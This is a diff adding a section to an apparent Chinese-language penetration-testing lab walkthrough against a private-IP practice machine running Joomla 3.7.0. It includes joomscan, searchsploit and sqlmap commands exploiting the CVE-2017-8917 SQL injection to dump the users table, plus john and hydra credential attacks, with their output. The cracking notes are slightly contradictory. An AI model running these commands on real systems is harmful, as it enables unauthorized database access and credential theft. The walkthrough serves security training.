@@ -106,3 +106,126 @@ joker:hannah
 hydra -l joker -P /usr/share/wordlists/rockyou.txt 172.16.168.135 -s 8080 http-get
 ```
 
+
+
+
+
+
+
+### 3. web CMS
+
+> wappalyzer: 插件查看使用的技术
+
+![image-20241125092713352](./assets/image-20241125092713352.png)
+
+> joomla: CMS
+
+```shell
+# joomal扫描
+joomscan -u http://joker:hannah@172.16.168.135:8080/
+
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 3.7.0
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking apache info/status files
+[++] Readable info/status files are not found
+
+[+] admin finder
+[++] Admin page : http://joker:hannah@172.16.168.135:8080/administrator/
+
+[+] Checking robots.txt existing
+[++] robots.txt is found
+path : http://joker:hannah@172.16.168.135:8080/robots.txt 
+```
+
+> 版本： `Joomla 3.7.0`
+
+```shell
+# 搜索漏洞 和 有一个靶场一样
+searchsploit Joomla 3.7.0
+
+# sql注入漏洞  php/webapps/42033.txt  查看漏洞信息
+searchsploit -p 42033
+
+# 详细信息
+cat /usr/share/exploitdb/exploits/php/webapps/42033.txt
+
+# Exploit Title: Joomla 3.7.0 - Sql Injection
+# Date: 05-19-2017
+# Exploit Author: Mateus Lino
+# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
+# Vendor Homepage: https://www.joomla.org/
+# Version: = 3.7.0
+# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
+# CVE : - CVE-2017-8917
+
+
+URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
+
+
+Using Sqlmap:
+
+sqlmap -u "http://joker:hannah@172.16.168.135:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+```
+
+```shell
+
+# 数据库信息
+available databases [2]:
+[*] information_schema
+[*] joomladb
+
+
+# 2 指定数据库，获取表名
+sqlmap -u "http://joker:hannah@172.16.168.135:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables
+
+# 3. dump #__users表列名
+sqlmap -u "http://joker:hannah@172.16.168.135:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T "#__users" --columns
+
+# 4. dump #__users表数据 
+sqlmap -u "http://joker:hannah@172.16.168.135:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T "#__users" -C username,password -dump
+```
+
+```shell
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| joomla   | $2y$10$eTtGk9VzhAt9Psr66eu3TONbi.fXL6A/ToAi7UnYNFLDv8n2I8K5u |
++----------+--------------------------------------------------------------+
+```
+
+````shell
+# 解密
+> 解密 password
+
+```shell
+touch pass.txt
+
+john --show pass.txt
+
+# hashid 识别是什么加密 hashid
+sudo apt install hashid 
+hashid pass.txt
+
+# 指定 加密方法
+sudo john 1.txt --format=bcrypt
+sudo john --show pass.txt
+
+?:snoopy # snoopy 密码
+```
+````
+
+> 解不开，知道用户名还是用`burp爆破`
+
+```shell
+joomla/joomla
+```
+
+
+
